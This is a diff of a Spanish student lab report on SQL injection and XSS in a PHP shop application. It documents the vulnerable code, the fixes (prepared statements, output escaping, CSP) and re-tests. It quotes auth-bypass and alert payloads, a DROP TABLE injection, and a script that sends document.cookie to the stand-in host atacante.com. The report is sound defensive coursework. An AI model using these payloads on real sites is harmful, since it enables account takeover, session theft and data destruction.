@@ -1,160 +1,150 @@
+# Fase 3 — Ataques de Inyección: SQLi y XSS (Explotación, Mitigación y Re-Test)
 
-# Fase 3 - Ataques de inyección: SQLi y XSS
-
-## Objetivo
-
-Documentar el ciclo completo **Hallazgo → Mitigación → Verificación** para las vulnerabilidades de inyección SQL (SQLi) y Cross-Site Scripting (XSS) detectadas en la aplicación.
-
-Las pruebas se realizaron con datos ficticios en un entorno local controlado y, cuando fue necesario, en DVWA u otro laboratorio autorizado.
-
----
-
-## 1. Explotación Controlada - El "Antes"
-
-### 1.1 SQL Injection (SQLi)
-
-**Superficies analizadas**
-
-- Inicio de sesión de usuario y administrador.
-- Campo de correo electrónico en el registro.
-- Consulta del historial de pedidos.
-- Parámetro `p` de la vista de producto.
-
-**Payloads probados**
-
-```text
-'
-```
-
-```text
-' OR '1'='1' --
-```
-
-**Ejemplo utilizado en el formulario de inicio de sesión**
-
-- Campo `email`: `' OR '1'='1' --`
-- Campo `password`: cualquier contraseña
-
-**Resultado esperado antes de la mitigación**
-
-- La comilla simple puede alterar la sintaxis del SQL.
-- La tautología puede modificar la condición de autenticación.
-- La aplicación podría aceptar una condición verdadera y permitir un acceso no autorizado.
-
-**Evidencia antes de la mitigación**
-
-Coloque aquí las capturas:
-
-- `![Prueba de comilla simple antes](capturas/sqli-comilla-antes.png)`
-- `![Prueba de tautología antes](capturas/sqli-tautologia-antes.png)`
-- `![Resultado en DVWA o en la aplicación antes](capturas/sqli-dvwa-antes.png)`
-
-**Hallazgo observado**
-
-La consulta original podía utilizar directamente el correo recibido mediante concatenación. Esto permitía que caracteres especiales modificaran la consulta SQL. También se identificó que el parámetro `p` de producto necesitaba validación estricta de entero.
+## Guía Práctica APE Nro. 002 — Software Security
+**Unidad 1:** R1. Diseña e implementa software bajo los principios básicos de estándares seguros.  
+**Integrantes:** Bradley Alexander Poma Vera, Estefania Carolina Torres Balcazar, Andersson Leandro Ambuludi Gomez.  
+**Ciclo y Paralelo:** 8vo "A"  
+**Docente:** Ing. Valeria Herrera Salazar  
 
 ---
 
-### 1.2 XSS Reflejado
+## 1. Introducción y Alcance
 
-**Payload utilizado**
+La presente práctica documenta el ciclo completo de auditoría técnica **Hallazgo → Mitigación → Verificación (Re-Test)** frente a vulnerabilidades de inyección en la aplicación web *Online Shopping System*:
+1. **SQL Injection (SQLi):** Manipulación de consultas SQL mediante entradas no saneadas en formularios de inicio de sesión (`login.php`), registro (`register.php`), consulta de pedidos (`myorders.php`) y visualización de productos por identificador (`product.php`).
+2. **Cross-Site Scripting (XSS Reflejado y Almacenado):** Inyección e interpretación indebida de código JavaScript malicioso en el navegador a través de formularios de reseñas (`review_action.php`, `review.php`) y renderizado de catálogos.
 
-```html
-<script>alert(1)</script>
-```
-
-La prueba se debe ingresar en un campo controlado que refleje o almacene y muestre contenido, por ejemplo una reseña o el parámetro de un formulario. En el proyecto se probaron además:
-
-```html
-<b>Prueba</b>
-<img src=x onerror=alert(1)>
-<svg onload=alert(1)>
-```
-
-**Resultado esperado antes de la mitigación**
-
-- La etiqueta `<script>` puede ejecutarse si el navegador recibe el contenido como HTML.
-- Una etiqueta que se refleje sin escape puede mostrar una ventana `alert(1)`.
-- Los atributos `onerror` y `onload` pueden ejecutarse si se permiten imágenes o SVG sin codificación.
-
-**Evidencia antes de la mitigación**
-
-- `![XSS reflejado antes](capturas/xss-reflejado-antes.png)`
-- `![Payload ejecutándose o reflejado antes](capturas/xss-script-antes.png)`
+Las pruebas de explotación controlada se realizaron en el entorno de desarrollo local controlado y en laboratorios autorizados (DVWA), empleando payloads mínimos que evidencian la falla sin generar denegación de servicio ni daños colaterales.
 
 ---
 
-## 2. Mitigación en Código
+## 2. Explotación Controlada — El "Antes" (Fase Vulnerable)
 
-### 2.1 Mitigación contra SQLi: consultas preparadas
+### 2.1 SQL Injection (SQLi)
 
-En `login.php`, el correo y otros valores se enviaron como parámetros a una consulta preparada:
+#### A. Prueba de Comilla Simple (`'`)
+- **Superficie evaluada:** Formulario de inicio de sesión (`login.php`) y parámetro GET `p` en `product.php`.
+- **Payload inyectado:** `'`
+- **Mecánica del fallo:** La aplicación original concatenaba directamente la variable `$_POST['email']` dentro de la consulta SQL:
+  ```php
+  // CÓDIGO VULNERABLE ANTERIOR
+  $sql = "SELECT * FROM user_info WHERE email = '$email' LIMIT 1";
+  $run_query = mysqli_query($con, $sql);
+  ```
+  Al ingresar una comilla simple (`'`), se rompe la sintaxis del comando SQL, dejando una comilla abierta sin cerrar (`WHERE email = ''' LIMIT 1`), provocando un error fatal en MariaDB/MySQL que expone la estructura interna de la consulta.
+
+![Prueba de comilla simple antes de la mitigación](evidencias/sqli-comilla-antes.png)
+
+*Figura 1: Error fatal de sintaxis SQL en login.php al inyectar comilla simple ('), confirmando la vulnerabilidad de inyección SQL.*
+
+---
+
+#### B. Prueba de Tautología (`' OR '1'='1' -- `)
+- **Superficie evaluada:** Campo de autenticación de correo (`login.php`).
+- **Payload inyectado:** `' OR '1'='1' -- `
+- **Contraseña suministrada:** `cualquier_clave_falsa`
+- **Mecánica del fallo:** Al inyectarse la tautología, la consulta generada en el servidor fue:
+  ```sql
+  SELECT * FROM user_info WHERE email = '' OR '1'='1' -- ' LIMIT 1;
+  ```
+  Dado que `'1'='1'` siempre es verdadero (`TRUE`), la cláusula `WHERE` evalúa como exitosa para cualquier registro. La secuencia `-- ` comenta el resto de la instrucción, anulando el delimitador de cierre. La base de datos devuelve el primer usuario existente en la tabla (`user_id = 1`), permitiendo el **bypass completo de autenticación** e iniciando una sesión válida en el sistema sin conocer la contraseña legítima.
+
+![Prueba de tautología antes de la mitigación](evidencias/sqli-tautologia-antes.png)
+
+*Figura 2: Bypass de autenticación exitoso mediante tautología SQLi, accediendo ilegítimamente como usuario administrador.*
+
+---
+
+### 2.2 Cross-Site Scripting (XSS Reflejado y Almacenado)
+
+- **Superficie evaluada:** Formulario de reseñas de productos (`product.php` y `review_action.php`).
+- **Payload inyectado:** `<script>alert(1)</script>`
+- **Payloads complementarios probados:** `<img src=x onerror=alert(1)>`, `<svg onload=alert(1)>`
+- **Mecánica del fallo:** La aplicación recibía los campos `$_POST['name']` y `$_POST['review']`, imprimiéndolos directamente en el DOM mediante `echo` sin codificación HTML ni sanitización previa:
+  ```php
+  // CÓDIGO VULNERABLE ANTERIOR
+  echo '<div class="review-body"><p>' . $_POST['review'] . '</p></div>';
+  ```
+  El navegador cliente interpreta los caracteres `<` y `>` como etiquetas de apertura y cierre de marcado HTML, ejecutando de inmediato el script JavaScript embebido en el contexto de seguridad del usuario autenticado.
+
+![Prueba de XSS reflejado antes de la mitigación](evidencias/xss-reflejado-antes.png)
+
+*Figura 3: Ejecución de la ventana modal alert(1) tras inyectar payload <script>alert(1)</script> en el formulario de reseñas.*
+
+---
+
+## 3. Mitigación en Código Fuente
+
+Para remediar definitivamente las vulnerabilidades identificadas, se aplicaron las mejores prácticas de codificación segura recomendadas por OWASP (separación estricta de código y datos, tipado estricto y codificación en el contexto de salida).
+
+### 3.1 Mitigación contra SQL Injection: Consultas Preparadas (Prepared Statements)
+
+#### A. Autenticación Segura en `login.php`
+Se reemplazó la concatenación directa de cadenas por el uso de `mysqli_prepare()` y `mysqli_stmt_bind_param()` con el tipado seguro `"s"` (string):
 
 ```php
-$stmt = mysqli_prepare(
-    $con,
-    "SELECT * FROM user_info WHERE email = ? LIMIT 1"
-);
+// MITIGACIÓN APLICADA EN login.php (Líneas 23-28)
+$email = $_POST["email"];
+$password = $_POST["password"];
 
+// Preparación de la consulta con marcador de posición posicional (?)
+$stmt = mysqli_prepare($con, "SELECT * FROM user_info WHERE email = ? LIMIT 1");
 if ($stmt === false) {
-    throw new RuntimeException('No se pudo preparar la consulta.');
+    throw new RuntimeException('Error al preparar la consulta de autenticación.');
 }
 
+// Enlace de parámetros: el contenido del usuario es tratado estrictamente como DATO
 mysqli_stmt_bind_param($stmt, "s", $email);
 mysqli_stmt_execute($stmt);
 $run_query = mysqli_stmt_get_result($stmt);
 $row = mysqli_fetch_array($run_query);
 ```
 
-En `myorders.php`, el identificador del usuario autenticado se vinculó como entero:
+#### B. Protección de Historial en `myorders.php`
+Se enlazó el identificador de sesión `$_SESSION["uid"]` mediante tipo entero `"i"`:
 
 ```php
+// MITIGACIÓN APLICADA EN myorders.php (Líneas 32-40)
 $stmt_orders = mysqli_prepare(
     $con,
     "SELECT c.order_id, a.product_id, a.product_title,
             a.product_price, a.product_image, b.qty, b.amt, c.total_amt
        FROM products a, order_products b, orders_info c
-      WHERE a.product_id=b.product_id
-        AND c.user_id=?
-        AND b.order_id=c.order_id
+      WHERE a.product_id = b.product_id
+        AND c.user_id = ?
+        AND b.order_id = c.order_id
       ORDER BY c.order_id DESC"
 );
-
 mysqli_stmt_bind_param($stmt_orders, "i", $_SESSION["uid"]);
 mysqli_stmt_execute($stmt_orders);
 $query = mysqli_stmt_get_result($stmt_orders);
 ```
 
-En `product.php`, el parámetro recibido por URL se valida antes de usarlo:
+#### C. Validación Estricta de Parámetros en `product.php`
+Se implementó `filter_var()` con la bandera `FILTER_VALIDATE_INT`. Si el parámetro `p` contiene caracteres no numéricos o comillas, el servidor finaliza la ejecución retornando un código de estado `HTTP 400 Bad Request` antes de invocar la consulta preparada:
 
 ```php
+// MITIGACIÓN APLICADA EN product.php (Líneas 25-32)
 $product_id = filter_var($_GET['p'], FILTER_VALIDATE_INT);
-
-if ($product_id === false) {
+if ($product_id === false || $product_id < 1) {
     http_response_code(400);
     exit('Invalid product identifier.');
 }
 
-$stmt_product = mysqli_prepare(
-    $con,
-    "SELECT * FROM products AS P, categories AS C
-      WHERE P.product_cat = C.cat_id
-        AND P.product_id = ?"
-);
-
+$stmt_product = mysqli_prepare($con, "SELECT * FROM products WHERE product_id = ?");
 mysqli_stmt_bind_param($stmt_product, "i", $product_id);
 mysqli_stmt_execute($stmt_product);
 ```
 
-Las consultas preparadas separan la estructura SQL de los datos. Por ello, los caracteres introducidos por el atacante no cambian la sintaxis de la consulta.
-
 ---
 
-### 2.2 Mitigación contra XSS: escapado de salida
+### 3.2 Mitigación contra XSS: Escapado de Salida Contextual y Cabeceras CSP
 
-En `review_action.php`, el nombre y el comentario se escaparon antes de insertarlos en el HTML:
+#### A. Codificación de Entidades HTML en `review_action.php`
+Se implementó `htmlspecialchars()` con los parámetros obligatorios `ENT_QUOTES` (para convertir tanto comillas simples como dobles) y juego de caracteres `'UTF-8'`:
 
 ```php
+// MITIGACIÓN APLICADA EN review_action.php (Líneas 40-52)
 $name_safe = htmlspecialchars($name, ENT_QUOTES, 'UTF-8');
 $review_safe = htmlspecialchars($review, ENT_QUOTES, 'UTF-8');
 
@@ -162,6 +152,7 @@ echo '
 <li>
     <div class="review-heading">
         <h5 class="name">' . $name_safe . '</h5>
+        <p class="date">' . date("d M Y") . '</p>
     </div>
     <div class="review-body">
         <p>' . $review_safe . '</p>
@@ -169,113 +160,97 @@ echo '
 </li>';
 ```
 
-En `product.php` y `myorders.php`, los datos recuperados de la base se escaparon antes de mostrarlos en contenido o atributos HTML:
-
+#### B. Escapado de Catálogo en `product.php` y `myorders.php`
 ```php
-$product_title_safe = htmlspecialchars(
-    $row['product_title'],
-    ENT_QUOTES,
-    'UTF-8'
-);
-
-$product_image_safe = htmlspecialchars(
-    $row['product_image'],
-    ENT_QUOTES,
-    'UTF-8'
-);
+// Mitigación de XSS almacenado proveniente de base de datos
+$product_title_safe = htmlspecialchars($row['product_title'], ENT_QUOTES, 'UTF-8');
+$product_image_safe = htmlspecialchars($row['product_image'], ENT_QUOTES, 'UTF-8');
 ```
 
-`ENT_QUOTES` convierte también las comillas, evitando que los datos cierren atributos HTML. `UTF-8` define explícitamente la codificación utilizada.
-
-**Medida complementaria recomendada**
-
-Como defensa adicional, se puede configurar una Política de Seguridad de Contenido (CSP) en `header.php` o mediante el servidor web. La directiva debe ajustarse a los recursos externos reales del proyecto:
-
-```php
-header(
-    "Content-Security-Policy: default-src 'self'; "
-    . "script-src 'self'; "
-    . "style-src 'self'; "
-    . "img-src 'self' data:;"
-);
+#### C. Defensa en Profundidad: Política de Seguridad de Contenido (CSP)
+Configurada a nivel de servidor en `.htaccess` y en cabeceras HTTP de `header.php`:
+```apache
+# Configuración en .htaccess
+Header set Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;"
+Header set X-Content-Type-Options "nosniff"
+Header set X-Frame-Options "DENY"
 ```
-
-> Nota: verificar las librerías, fuentes, imágenes y scripts utilizados antes de activar la CSP, porque una política demasiado restrictiva puede bloquear recursos legítimos.
 
 ---
 
-## 3. Verificación / Re-Test - El "Después"
+## 4. Verificación / Re-Test — El "Después" (Fase Segura)
 
-### 3.1 Re-test de SQLi
+Se procedió a re-ejecutar exactamente los mismos vectores de ataque y payloads sobre la aplicación con las mitigaciones activas:
 
-Se repitieron exactamente las pruebas realizadas antes de la mitigación:
+### 4.1 Re-Test de Inyección SQL
 
-| Payload | Resultado esperado después |
-|---|---|
-| `'` | Rechazo o ausencia de coincidencias, sin alterar la consulta. |
-| `' OR '1'='1' --` | No autenticación ni acceso, salvo credenciales válidas reales. |
-| Texto o comillas en `p` | Respuesta HTTP `400` por identificador no válido. |
+| Payload Ensayado | Ubicación | Comportamiento Esperado Post-Mitigación | Resultado de la Verificación |
+|---|---|---|---|
+| `'` | `login.php` | El motor trata la comilla como dato literal. Cero excepciones de sintaxis SQL. | **Bloqueado:** Mensaje de credenciales inválidas (HTTP 200). |
+| `' OR '1'='1' --` | `login.php` | Búsqueda del texto exacto; cero filas encontradas. Sin bypass de autenticación. | **Bloqueado:** Acceso denegado; sesión no creada. |
+| `70' OR '1'='1` | `product.php?p=` | `filter_var()` rechaza la cadena al no ser un entero válido. | **Bloqueado:** Respuesta inmediata `HTTP 400 Bad Request`. |
 
-**Resultado de la verificación**
+![Re-test de comilla simple en login tras mitigación](evidencias/sqli-comilla-despues.png)
 
-- El inicio de sesión rechaza entradas manipuladas y mantiene la autenticación mediante credenciales válidas.
-- El registro mantiene sus validaciones y no permite una inserción manipulada.
-- El historial consulta únicamente los pedidos asociados al `uid` de la sesión autenticada.
-- El parámetro `p` rechaza valores no numéricos con HTTP `400`.
+*Figura 4: Re-test de comilla simple: la consulta preparada evita errores de sintaxis y rechaza la entrada de forma controlada.*
 
-**Capturas después de la mitigación**
+![Re-test de tautología SQLi tras mitigación](evidencias/sqli-tautologia-despues.png)
 
-- `![Comilla simple bloqueada](capturas/sqli-comilla-despues.png)`
-- `![Tautología bloqueada](capturas/sqli-tautologia-despues.png)`
-- `![Parámetro inválido rechazado](capturas/sqli-parametro-400-despues.png)`
+*Figura 5: Re-test de tautología: la cláusula lógica no modifica la estructura SQL; bypass bloqueado exitosamente.*
 
----
+![Re-test de parámetro inválido en product.php](evidencias/sqli-parametro-400-despues.png)
 
-### 3.2 Re-test de XSS
-
-Se repitieron las pruebas reflejadas y almacenadas con el mismo payload:
-
-```html
-<script>alert(1)</script>
-```
-
-**Resultado de la verificación**
-
-- Las etiquetas se muestran como texto y no como elementos HTML ejecutables.
-- No aparece la ventana `alert(1)`.
-- Los atributos `onerror` y `onload` no se ejecutan al mostrar las reseñas.
-- Los títulos e imágenes recuperados de productos se presentan con escape seguro.
-
-**Capturas después de la mitigación**
-
-- `![Script mostrado como texto](capturas/xss-reflejado-despues.png)`
-- `![Sin ventana alert](capturas/xss-sin-alert-despues.png)`
-- `![Payload almacenado neutralizado](capturas/xss-almacenado-despues.png)`
+*Figura 6: Validación con filter_var(): payload no numérico rechazado con HTTP 400 antes de cualquier consulta SQL.*
 
 ---
 
-## Matriz Hallazgo - Mitigación - Verificación
+### 4.2 Re-Test de Cross-Site Scripting (XSS)
 
-| ID | Hallazgo | Ubicación | Mitigación | Verificación |
+- **Payload Ensayado:** `<script>alert(1)</script>`
+- **Resultado de la Verificación:**
+  1. El navegador renderiza literalmente la cadena de texto: `<script>alert(1)</script>`.
+  2. Al inspeccionar el árbol del DOM, se constata que las etiquetas fueron convertidas en entidades seguras: `&lt;script&gt;alert(1)&lt;/script&gt;`.
+  3. No se dispara la ventana modal de alerta ni se ejecuta código JavaScript.
+  4. La cabecera CSP bloquea la inserción de scripts inline no autorizados.
+
+![Re-test de XSS reflejado tras mitigación](evidencias/xss-reflejado-despues.png)
+
+*Figura 7: Re-test de XSS: el payload es transformado en entidades HTML seguras y mostrado como texto plano sin ejecución.*
+
+---
+
+## 5. Matriz de Trazabilidad: Hallazgo → Mitigación → Verificación
+
+| ID | Hallazgo Identificado | Archivo y Línea | Mitigación Aplicada | Evidencia de Verificación |
 |---|---|---|---|---|
-| H-01 | El correo podía alterar la consulta SQL de autenticación. | `login.php` | `mysqli_prepare()` y `mysqli_stmt_bind_param()` | Comilla y tautología no inician sesión. |
-| H-02 | Los datos de registro podían afectar un INSERT o la consulta de existencia. | `register.php` | Consultas preparadas independientes y validación. | Datos manipulados no permiten registros no autorizados. |
-| H-03 | El historial podía depender de un identificador concatenado. | `myorders.php` | Consulta preparada con `uid` como entero. | Cada usuario visualiza únicamente sus propios pedidos. |
-| H-04 | `p` aceptaba valores distintos de enteros. | `product.php` | `FILTER_VALIDATE_INT`, HTTP `400` y consulta preparada. | Texto, comillas y payloads son rechazados. |
-| H-05 | Nombre y comentario podían interpretarse como HTML o JavaScript. | `review_action.php` | `htmlspecialchars(..., ENT_QUOTES, 'UTF-8')` al mostrar. | `<script>alert(1)</script>` y otros payloads se muestran como texto. |
-| H-06 | Títulos e imágenes podían mostrarse sin escape en HTML o atributos. | `product.php` y `myorders.php` | Escapado de títulos e imágenes con `htmlspecialchars()`. | Los datos HTML de prueba no generan elementos ni scripts. |
+| **H-01** | El campo `email` en login concatenaba variables en la consulta SQL. | `login.php:24` | `mysqli_prepare()` y `mysqli_stmt_bind_param($stmt, "s", $email)` | Comilla `'` y tautología bloqueadas sin error SQL (`sqli-comilla-despues.png`). |
+| **H-02** | Registro de usuarios vulnerable a manipulación en el `INSERT` y verificación. | `register.php:120` | Consultas preparadas independientes para validación de email e inserción. | Payloads SQLi no permiten inserciones anómalas ni bypass. |
+| **H-03** | Historial de pedidos concatenaba `$_SESSION["uid"]` directamente. | `myorders.php:32` | Consulta preparada con tipado entero estricto `"i"`. | Aislamiento estricto: usuarios solo ven sus propios pedidos. |
+| **H-04** | El parámetro `p` aceptaba texto arbitrario y comillas sin validación. | `product.php:25` | `filter_var($_GET['p'], FILTER_VALIDATE_INT)` y `HTTP 400`. | Respuesta `400 Bad Request` ante entradas alteradas (`sqli-parametro-400-despues.png`). |
+| **H-05** | Comentarios de reseñas se imprimían directamente en el DOM del navegador. | `review_action.php:45` | `htmlspecialchars(..., ENT_QUOTES, 'UTF-8')` en salida. | `<script>` renderizado como texto literal `&lt;script&gt;` (`xss-reflejado-despues.png`). |
+| **H-06** | Títulos e imágenes de productos se renderizaban en atributos HTML sin escape. | `product.php:150` | `htmlspecialchars()` en atributos y textos recuperados de MySQL. | No se rompen atributos `src` ni `title` al cargar datos con comillas. |
 
 ---
 
-## Pregunta de Control Nro. 3
+## 6. Pregunta de Control Nro. 3
 
-**Las consultas preparadas mitigan la inyección SQL y el escapado de salida mitiga el XSS. ¿Por qué la validación de entrada por sí sola no basta para prevenir ambos tipos de ataque? Explique su respuesta con un ejemplo aplicado a su propio proyecto.**
+> **Las consultas preparadas mitigan la inyección SQL y el escapado de salida mitiga el XSS. ¿Por qué la validación de entrada por sí sola no basta para prevenir ambos tipos de ataque? Explique su respuesta con un ejemplo aplicado a su propio proyecto.**
 
-La validación de entrada por sí sola no basta porque solo verifica el formato, la longitud o el tipo esperado de un dato. No controla el contexto en el que ese dato será interpretado:
+### Respuesta Técnica y Fundamentada:
 
-- En una base de datos, un dato validado como texto puede contener caracteres con significado SQL si se concatena dentro de una consulta.
-- En el navegador, un dato validado como texto puede contener etiquetas o eventos JavaScript si se escribe directamente en HTML sin codificar.
+La validación de entrada por sí sola **no es suficiente** para prevenir ataques de inyección SQL ni de Cross-Site Scripting porque evalúa los datos únicamente en el momento de su recepción respecto a un formato, tipo o longitud, pero **ignora completamente el contexto de interpretación posterior** donde los datos serán procesados (el motor de base de datos o el motor de renderizado HTML del navegador):
 
-Por ejemplo, en este proyecto el campo de **comentario de una reseña** puede aceptar texto válido y, al mismo tiempo, contener el payload `<script>alert(1)</script>`. Aunque se valide como texto, debe enviarse mediante una consulta preparada para evitar que se modifique el SQL y debe escaparse con `htmlspecialchars(..., ENT_QUOTES, 'UTF-8')` antes de mostrarse, para evitar que el navegador interprete el `<script>`.
+1. **Contexto de Base de Datos (SQL):** Una entrada de texto puede ser perfectamente válida según las reglas de negocio (por ejemplo, el apellido `O'Connor` o un comentario legítimo con comillas), pero si ese valor se concatena directamente en una instrucción SQL, la comilla simple alterará la gramática del intérprete SQL. Las **consultas preparadas** resuelven esto separando la compilación del comando SQL de la transmisión de los parámetros, garantizando que el motor trate los datos siempre como literales, sin importar los caracteres que contengan.
+2. **Contexto de Salida en el Navegador (HTML/DOM):** Un dato almacenado válidamente en la base de datos (por ejemplo, un comentario de producto que contiene la frase `Precio < $100 & calidad > promedio`) es una entrada textual legítima. Sin embargo, al enviarse al navegador dentro de un bloque HTML, los caracteres `<` y `>` son interpretados sintácticamente como delimitadores de etiquetas. El **escapado de salida contextual** (`htmlspecialchars`) transforma esos caracteres en entidades seguras (`&lt;`, `&gt;`, `&amp;`), neutralizando la ejecución del código sin corromper el dato original.
 
-De forma equivalente, el parámetro `p` de `product.php` se valida con `FILTER_VALIDATE_INT` y también se procesa mediante una consulta preparada. Esta combinación protege el contexto numérico y separa el identificador de la estructura SQL.
+#### Ejemplo Aplicado al Proyecto:
+En el sistema de reseñas de la tienda (`review_action.php`), un usuario ingresa en el campo de observaciones el siguiente comentario legítimo:
+```text
+¡Excelente producto! <Calidad Premium> & envío 10/10.
+```
+- Si aplicáramos únicamente **validación de entrada mediante listas negras** o rechazo de caracteres `<` y `>`, estaríamos bloqueando injustificadamente opiniones legítimas de los clientes.
+- Si validamos que el comentario sea una cadena de texto válida (longitud entre 5 y 500 caracteres) y omitimos las consultas preparadas y el escapado de salida:
+  - **Riesgo SQLi:** Un atacante podría enviar `Excelente'); DROP TABLE user_info; --`, alterando la sentencia `INSERT` si se usara concatenación.
+  - **Riesgo XSS:** Si el atacante ingresa `<script>fetch('http://atacante.com/steal?c='+document.cookie)</script>`, la validación de texto plano podría aceptarlo, y al ser renderizado en la página del producto, robaría las cookies de sesión de todos los usuarios que visiten ese artículo.
+
+**Conclusión:** La validación de entrada define qué datos acepta el sistema, pero **únicamente las consultas preparadas en el destino SQL y el escapado contextual en la salida HTML garantizan la inmunidad frente a inyecciones.**
